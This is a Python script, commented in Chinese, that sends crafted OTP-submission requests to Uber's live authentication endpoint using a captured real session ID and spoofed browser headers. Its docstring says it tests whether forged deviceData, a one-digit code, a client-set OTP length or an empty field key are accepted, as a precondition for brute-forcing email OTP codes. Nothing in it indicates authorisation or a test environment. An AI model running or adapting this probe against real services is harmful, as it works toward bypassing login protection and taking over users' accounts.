"""用用户页面的真实 session + 短 deviceData 测试 OTP 提交接口校验强度
关键问题：OTP 提交是否校验 deviceData？
  - 返回 EMAIL_OTP_INCORRECT -> deviceData 不校验（爆破前提成立）
  - 返回 recaptcha.invalid_token / RTAPI_FORBIDDEN -> deviceData 或 session 强校验
变体测试（间隔3秒，礼貌频率）：
  V1 emailOTPCode=1234 + deviceData='AAAA'     对照：字段名 emailOTPCode
  V2 emailOTPCode=5   + deviceData='AAAA'      1位OTP -> 长度是否校验
  V3 otpWidth=1 + emailOTPCode=1234             客户端长度参数是否生效
  V4 空字段名 ''=0000 + deviceData='AAAA'      对照：空key格式
"""
import sys, json, uuid, time, requests
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://cn-geo1.uber.com/rt/silk-screen"
SESSION = "ccbeb8ce-6c4d-47ef-971e-9e7d18c25450_de573c49-23d3-4293-b40c-99059ca5d00e"
USL_ID = "e78c5663-84e9-4af7-970c-9ac188575784"
ANALYTICS_SID = "8ea4f450-ce1a-43e3-9e86-54112f923140"

def headers():
    return {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://auth.uber.com",
        "referer": "https://auth.uber.com/",
        "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
        "x-uber-analytics-session-id": ANALYTICS_SID,
        "x-uber-client-name": "usl_desktop",
        "x-uber-marketing-id": USL_ID,
        "x-uber-request-uuid": str(uuid.uuid4()),
        "x-uber-usl-id": USL_ID,
    }

def otp_payload(otp_val, field_key="emailOTPCode", otp_width=None):
    sa = {"screenType": "EMAIL_OTP_CODE", "eventType": "TypeEmailOTP",
          "fieldAnswers": [{"fieldType": "EMAIL_OTP_CODE", field_key: otp_val}]}
    if otp_width is not None:
        sa["otpWidth"] = otp_width
    return {"formContainerAnswer": {"inAuthSessionID": SESSION, "formAnswer": {
        "flowType": "SIGN_UP", "standardFlow": True, "accountManagementFlow": False,
        "daffFlow": False,
        "productConstraints": {"isEligibleForWebOTPAutofill": False, "uslFELibVersion": "",
                               "uslMobileLibVersion": "", "isWhatsAppAvailable": False,
                               "isPublicKeyCredentialSupported": True, "isFacebookAvailable": False,
                               "isRakutenAvailable": False, "isKakaoAvailable": False},
        "additionalParams": {"isEmailUpdatePostAuth": False},
        "deviceData": "AAAA",
        "nextURL": "https://m.uber.com", "uslURL": "https://auth.uber.com/v2/",
        "authDomain": "auth.uber.com",
        "screenAnswers": [sa]}}}

def run(name, payload):
    try:
        r = requests.post(f"{BASE}/submit-form", json=payload, headers=headers(), timeout=15)
        print(f"{name}: {r.status_code} {r.text[:400]}")
    except Exception as e:
        print(f"{name}: ERR {str(e)[:150]}")
    time.sleep(3)

print("=== V1: emailOTPCode=1234 + deviceData=AAAA ===")
run("V1", otp_payload("1234"))

print("\n=== V2: emailOTPCode=5(1位) + deviceData=AAAA ===")
run("V2", otp_payload("5"))

print("\n=== V3: otpWidth=1 + emailOTPCode=1234 ===")
run("V3", otp_payload("1234", otp_width=1))

print("\n=== V4: 空key ''=0000 + deviceData=AAAA ===")
run("V4", otp_payload("0000", field_key=""))
